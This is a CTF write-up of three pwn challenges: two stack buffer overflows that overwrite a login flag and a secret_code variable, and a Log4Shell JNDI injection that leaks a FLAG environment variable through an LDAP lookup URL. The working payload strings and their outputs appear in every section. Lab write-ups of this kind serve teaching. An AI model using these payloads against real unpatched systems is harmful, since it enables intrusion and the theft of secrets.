---
title: "Neuland CTF 2022 Winter - PWN"
authors: ["0xFFD700", "manuv"]
date: 2022-12-07T18:04
published: true
tags:
- CTF
- Writeup
- Cybersecurity
---

## Password Guessing - Easy

*Can you guess the secret password? It changes every time you start the program. There is no chance you get it right. Try your luck!*

<br>

*PS: You definitly need the password to get the flag. There is no way around.*

*You can test your solution locally. Connect to the server once it works to retrieve to flag:* 

<br>

*nc summit.informatik.sexy 8083*

<br>

[password_guessing.c](/files/neuland-ctf-12-2022/password_guessing.c)

<br>

We will start off by looking at the provided source code. A random password is generated every time the program is executed. The flag gets printed out if `logged_in == 1`. `logged_in` is set to 1 if we get the right password. We would have a hard time trying to guess the password and set `logged_in` to 1 through this way. Luckily the code uses `gets` to get the user input. `gets` does not check the array boundaries and we can input as many characters as we like. This allows us to overwrite the value of `logged_in`. A basic understanding of the stack is usefull to understand why this works. We can just input a bunch of characters (> 60) and the flag will be returned:

```
$ ./password_guessing                         
Guess the random password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wrong Password

nland{dummy-flag}
```

Executed on the server we get the flag:

```
$ nc summit.informatik.sexy 8083
Guess the random password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wrong Password

nland{51mpl3_45_7h47}
```

The flag is ``nland{51mpl3_45_7h47}`.

<br>

## h4ck3r - Medium

*Can you find a way to change `secret_code`? I you do so I will reward you with a flag.*

*You can test your solution locally. Connect to the server once it works to retrieve to flag:* <br>
*nc summit.informatik.sexy 8081*

<br>

[h4ck3r.c](/files/neuland-ctf-12-2022/h4ck3r.c)

<br>

At first sight the task seems impossible. In order to get the flag the value of `secret_code` must be 0x1337. However, the variable is initialized with 0xC001D00D and is not changed during runtime. This means no matter what value we input as our hacker name, the value of `secret_code` will still be wrong. However, there is a small detail we have to take into consideration. The read function is used to save the user input in an array of size 100. The read function takes up to 0x100 = 256 characters and writes them to `name`. This allows us to go out of bounds and to change values on the stack. What a coincidence. This allows us the change the value of `secret_code` to whatever we want. Therefore we need to find the right offset to overwrite the memory area of `secret_code`. 

We can use python to generator inputs of a certain length and pipe them into the program. We know that the input must be at least 100 characters long.
```
$ python -c "print('A'*100)" | ./h4ck3r
```

At the end of this input we need to append the value of `secret_code`. Due to little endian we have to reverse the order of the bytes.
```
python -c "print('A'*100 + '\x37\x13\x00\x00')" | ./h4ck3r
```

Now we are good to go and we can try inputs of different lengths by increasing the number of A's. We can use GDB or change the program locally to give us more information on where excatly the offset of the memory area is. 108 A's is the sweetspot. We can send the payload to the server and we will get the flag.

```
$ python -c "print('A'*108 + '\x37\x13\x00\x00')" | nc localhost 8080
Enter your hacker name: Access granted!
nland{y0u_4r3_4_r34l_h4ck3r_n0w}
```

The flag is `nland{y0u_4r3_4_r34l_h4ck3r_n0w}`.

<br>

## Log4Flag - Hard

*There is this program that is supposed to give me the flag. However, even if I beg for it and say the magic word, it won't return it. Try to lookup the flag.*

*You can test your solution locally. Connect to the server once it works to retrieve to flag:* <br>
*nc summit.informatik.sexy 8082*

<br>

[Log4Flag.zip](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Winter/blob/ced4cc975bdbe9e96325c74e69775142f68267f6/CTF%20Aufgaben/PWN/Log4Flag%20-%20Hard/Public/Log4Flag.zip)

<br>

This is the response if we connect to the server:
```
$ nc summit.informatik.sexy 8082
Do you want the flag?
yes
Try Harder! <3

Do you want the flag?
no
What are you even doing here? :P

Do you want the flag?
test 
Try a different input!

Do you want the flag?
...
```

Running the code locally with `run.sh` yields the same results. The response won't help us much for now. The `Log4Flag.zip` contains Java bytecode in the file `Log4Flag.class`. We can use `bytecode-viewer` or a website like [javadecompilers](http://www.javadecompilers.com/) to get the Java source code.

```java
import java.util.Scanner;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Log4Flag {
    public static void main(String[] array) {
        try {
            final Logger logger = LogManager.getLogger("Log4Flag");

            while (true) {
                System.out.println("Do you want the flag?");
                String input = new Scanner(System.in).next();

                if (input.toLowerCase().contains("yes") && input.toLowerCase().contains("please")) {
                    System.out.println("I won't give you the flag this easily!");
                    logger.error("Unauthorized access attempt with input: {}", (Object) input);
                } else if (input.toLowerCase().contains("yes")) {
                    System.out.println("Try Harder! <3");
                } else if (input.toLowerCase().contains("please")) {
                    System.out.println("Getting closer!");
                } else if (input.toLowerCase().contains("no")) {
                    System.out.println("What are you even doing here? :P");
                } else {
                    System.out.println("Try a different input!");
                }
                System.out.println("");
            }
        } catch (Exception x) {
            System.err.println(x);
        }
    }
}
```

We can see that the code is using log4j. This should ring a bell about the zero day exploit in log4j that was published about a year ago [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228). Knowing this and looking at the challenge name, it is kind of obvious what we should do now. We need to use this vulnerability to find the flag.

We can also see that the logger is used if our input contains the words "yes" and "please". 
```bash
$ ./run.sh
Do you want the flag?
yesplease
I won't give you the flag this easily!
22:01:16.185 [main] ERROR Log4Flag - Unauthorized access attempt with input: yesplease
```

We can see that we now get a response from the logger as well. However, we haven't gotten the flag yet. We need to dig deeper.
We will start with a PoC to show that the vulnerability is present in the code:

```
$ ./run.sh 
Do you want the flag?
${jndi:ldap://127.0.0.1/test}yesplease
I won't give you the flag this easily!
2022-11-25 21:58:39,272 main WARN Error looking up JNDI resource [ldap://127.0.0.1/test]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
        at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:252)
        at java.naming/com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
        ...

21:58:39.179 [main] ERROR Log4Flag - Unauthorized access attempt with input: ${jndi:ldap://127.0.0.1/test}yesplease
```

The error messages proof that the vulnerability exists. The server tries to conntact a LDAP server and the connection gets refused. If we have a LDAP server, we could try to send request to it in order to create a reverse shell. This is not neccessary in this example. If we look at the `run.sh` script, we can see that the flag is saved in an environment variable called `FLAG`.
We can perform an environment lookup with log4j and retrieve the flag from the environment variables. 

```
$ ./run.sh     
Do you want the flag?
${jndi:ldap://127.0.0.1/${env:FLAG}}yesplease
I won't give you the flag this easily!
2022-11-25 22:10:38,008 main WARN Error looking up JNDI resource [ldap://127.0.0.1/nland{dummy-flag}]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
...

22:10:37.920 [main] ERROR Log4Flag - Unauthorized access attempt with input: ${jndi:ldap://127.0.0.1/${env:FLAG}}yesplease
```

We managed to exploit the code locally and to retrieve the dummy flag. It is contained in the exception log. Now we just have to execute the same payload on the server and we will be rewarded with the real flag. <br>
The flag is `nland{3nv1r0nm3n7_l00kup_&_m461c_w0rd_4_fl4g}`.
